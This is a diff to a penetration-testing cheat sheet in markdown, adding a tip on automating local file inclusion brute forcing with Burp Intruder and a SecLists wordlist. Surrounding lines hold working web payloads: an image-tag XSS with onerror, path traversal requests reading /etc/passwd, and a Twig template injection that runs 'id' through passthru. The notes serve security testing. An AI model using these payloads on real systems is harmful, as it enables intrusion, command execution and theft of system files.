@@ -185,6 +185,7 @@ eg. `![thisisalttext](https://somedomain.com/someimage.png"onerror=alert(1337);/
   - Execute the payload by requesting the following URL (the above vulnerable parameter has been used as an example) `/secret-script.php?file=<generated_chain>`
 #### LFI
 - LFI can be tested by submitting a request similar to `/secret-script.php?file=..//..//..//..//etc//passwd`
+- You can use a tool such as Burp Intruder to automate brute forcing of sensitive files on Linux if necessary. Example top line of the request in Intruder `GET /script.php?page=..//..//..//etc/passwd HTTP/1.1` Modify this to have the payload markers around etc/passwd and add in a suitable wordlist into the payload section (https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
 ### SSTI
 - On Twig version 2.14.0 or below with the sandbox mode enabled `{{['id',""]|sort('passthru')}}`
 ### Databases
